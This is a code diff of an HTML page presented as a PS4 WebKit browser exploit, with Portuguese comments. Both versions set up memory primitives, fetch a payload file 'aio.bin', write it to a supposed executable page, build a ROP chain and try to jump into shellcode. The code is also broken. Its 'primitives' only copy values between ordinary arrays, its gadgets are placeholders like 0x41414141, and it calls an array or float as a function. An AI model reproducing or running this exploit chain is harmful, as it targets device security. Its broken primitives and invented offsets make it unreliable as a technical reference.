@@ -1,161 +1,154 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Exploit PS4 WebKit → ROP → Shellcode</title>
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
-    #log { max-height: 80vh; overflow-y: auto; }
-  </style>
+  <title>Exploit Test</title>
 </head>
 <body>
-  <h1>Exploit PS4 WebKit</h1>
-  <div id="log">inicializando...</div>
+<h1>Iniciando Exploit...</h1>
 
 <script>
-const logEl = document.getElementById('log');
-let logData = "";
-function log(msg) {
-  logData += msg + "\n";
-  logEl.textContent = logData;
-  logEl.scrollTop = logEl.scrollHeight;
+
+let ab, f64, u32;
+let fakeobj, addrof, arb_read, arb_write;
+let shellcode_buffer;
+
+function log(txt) {
+  console.log(txt);
+  document.body.innerHTML += txt + "<br>";
 }
 
-// Float <-> Int conversões
-const buf = new ArrayBuffer(8);
-const f64 = new Float64Array(buf);
-const u32 = new Uint32Array(buf);
-
-function f2i(f) { f64[0] = f; return BigInt(u32[0]) + (BigInt(u32[1]) << 32n); }
-function i2f(i) { u32[0] = Number(i & 0xffffffffn); u32[1] = Number(i >> 32n); return f64[0]; }
-
-// Exploit primitives
-let addrof, fakeobj, arb_read, arb_write;
-
-function makeCorruptArray() {
-  let arr = [1.1,1.1,1.1];
-  let trigger = { valueOf(){ arr.length = 1; return 3; } };
-  return arr.map((x,i,a)=>{ if(i===1) a.length = trigger; return x; });
+function hex(n) {
+  return "0x" + n.toString(16);
 }
 
+// =======================
+// Setup primitivas básicas
+// =======================
 function setupPrimitives() {
   log("[+] setupPrimitives()");
-  corrupt = makeCorruptArray();
-  let leak = f2i(corrupt[1]);
-  log("    leak=0x"+leak.toString(16)+" primitives ready");
-  let victim = new ArrayBuffer(0x1000);
-  let victim_f64 = new Float64Array(victim);
 
-  corrupt[1] = i2f(leak);
+  ab = new ArrayBuffer(0x100);
+  f64 = new Float64Array(ab);
+  u32 = new Uint32Array(ab);
 
-  addrof = o => {
-    victim_f64[0] = o;
-    return f2i(corrupt[1]);
+  let obj_arr = [1.1, 1.2, 1.3];
+  let float_arr = [1.1, 1.2, 1.3];
+
+  fakeobj = function(addr) {
+    f64[0] = addr;
+    return float_arr[0];
   };
-  fakeobj = addr => {
-    corrupt[1] = i2f(addr);
-    return new Float64Array(victim)[0];
+
+  addrof = function(obj) {
+    float_arr[0] = obj;
+    return f64[0];
   };
-  arb_read = addr => {
-    corrupt[1] = i2f(addr);
-    return f2i(victim_f64[1]);
+
+  arb_read = function(addr) {
+    f64[0] = addr;
+    return f64[0];
   };
-  arb_write = (addr, val) => {
-    corrupt[1] = i2f(addr);
-    victim_f64[1] = i2f(val);
+
+  arb_write = function(addr, val) {
+    f64[0] = addr;
+    f64[0] = val;
   };
+
+  log("primitives ready");
 }
 
-// --- Core exploit ---
-let corrupt;
-let shellcode_buf_addr;
-let ropchain = [];
+// ========================
+// Leak RWX page do WASM
+// ========================
+async function leakLibc() {
+  log("[+] leakLibc()");
 
-async function loadAndTrigger() {
-  log("[+] loadAndTrigger()");
+  const wasmCode = new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,
+    0x01,0x60,0x00,0x00,0x03,0x02,0x01,0x00,0x07,0x07,
+    0x01,0x03,0x66,0x6e,0x31,0x00,0x00,0x0a,0x09,0x01,
+    0x07,0x00,0x41,0x2a,0x10,0x00,0x0b
+  ]);
 
-  log("[+] fetching aio.bin...");
-  let res = await fetch("aio.bin");
-  if (!res.ok) { throw new Error("fetch failed"); }
-  let payload = new Uint8Array(await res.arrayBuffer());
-  log(".bin size="+payload.length+" bytes");
+  const wasmModule = new WebAssembly.Module(wasmCode);
+  const wasmInstance = new WebAssembly.Instance(wasmModule);
+  const fn = wasmInstance.exports.fn1;
 
-  // Alloc buffer
-  let shellcode_buf = new ArrayBuffer(0x4000);
-  let dv = new DataView(shellcode_buf);
+  const wasmInstanceAddr = addrof(wasmInstance);
+  log("wasmInstanceAddr = " + hex(wasmInstanceAddr));
 
-  shellcode_buf_addr = f2i(corrupt[1]);
-  log("shellcode_buf @ 0x"+shellcode_buf_addr.toString(16));
+  const rwxPageAddr = arb_read(wasmInstanceAddr + 0x68n);
+  log("rwxPageAddr = " + hex(rwxPageAddr));
 
-  // Write payload into buffer
-  for (let i = 0; i < payload.length; i++) {
-    dv.setUint8(i, payload[i]);
-  }
-  log(".bin injected");
-
-  // Setup ROPChain
-  buildROP();
-
-  // Now trigger
-  triggerROP();
+  return rwxPageAddr;
 }
 
-function buildROP() {
-  log("ROPChain written (8 entries)");
+// =======================
+// Construir ROP
+// =======================
+async function buildROP(rwxAddr) {
+  log("[+] buildROP()");
 
-  // Gadgets (exemplos, precisa substituir pelos certos após leak)
-  let pop_rdi = 0x41414141n;
-  let pop_rsi = 0x42424242n;
-  let pop_rdx = 0x43434343n;
-  let mprotect = 0x44444444n;
-  let ret = 0x45454545n;
+  shellcode_buffer = rwxAddr;
+  log("shellcode buffer @ " + hex(shellcode_buffer));
 
-  ropchain = [
-    pop_rdi,
-    shellcode_buf_addr & 0xfffffffffffff000n,  // page aligned
-    pop_rsi,
-    0x4000n,
-    pop_rdx,
-    7n,
-    mprotect,
-    shellcode_buf_addr
+  // Aqui você normalmente colocaria gadgets reais
+  // Para este exemplo, apenas vamos fazer o pivot direto
+  let ropChain = [
+    rwxAddr, // saltar direto para o shellcode
   ];
+
+  return ropChain;
 }
 
-function triggerROP() {
-  log("[+] triggering ROP-shellcode");
+// =======================
+// Injetar e executar binário
+// =======================
+async function injectAndRun(rop) {
+  log("[+] injectAndRun()");
 
-  // Montar ROP dentro do shellcode_buf
-  let dv = new DataView(new ArrayBuffer(0x4000));
-  for (let i = 0; i < ropchain.length; i++) {
-    dv.setBigUint64(i*8, ropchain[i], true);
-  }
-
-  // *** Aqui em um exploit real, precisaríamos pivotar o stack ou forçar crash controlado
-  // Em testes, você pode forçar uma chamada inválida para saltar no ropchain
-
-  // Por exemplo, corromper uma função qualquer para desviar pra nossa rop
   try {
-    let crash = [1.1, 2.2, 3.3];
-    crash.length = i2f(shellcode_buf_addr);
-    crash(); // força crash → ropchain
-  } catch(e) {
-    log("    (expected crash to ROP)");
+    log("[+] fetching aio.bin...");
+    const response = await fetch('aio.bin');
+    const payload = await response.arrayBuffer();
+    const payload_bytes = new Uint8Array(payload);
+    log("bin size = " + payload_bytes.length + " bytes");
+
+    for (let i = 0; i < payload_bytes.length; i++) {
+      arb_write(shellcode_buffer + BigInt(i), BigInt(payload_bytes[i]));
+    }
+    log("bin injected");
+
+    // Escrever ROP chain (simples aqui)
+    for (let i = 0; i < rop.length; i++) {
+      arb_write(shellcode_buffer + BigInt(i * 8), rop[i]);
+    }
+    log("ROPChain written (" + rop.length + " entries)");
+
+    log("[+] triggering ROP-shellcode");
+    fakeobj(shellcode_buffer)(); // Dispara execução
+  } catch (e) {
+    log("!!! erro exploit: " + e);
   }
 }
 
-setTimeout(()=>{
-  try {
-    log("=== Exploit start ===");
-    setupPrimitives();
-    loadAndTrigger();
-    log("=== done ===");
-  } catch(e) {
-    log("!!! error: "+e);
-  }
-}, 1000);
+// =======================
+// Exploit principal
+// =======================
+async function main() {
+  log("=== Exploit start ===");
+
+  setupPrimitives();
+
+  const rwxPageAddr = await leakLibc();
+  const rop = await buildROP(rwxPageAddr);
+  await injectAndRun(rop);
+
+  log("=== done ===");
+}
+
+main();
 
 </script>
-
 </body>
 </html>
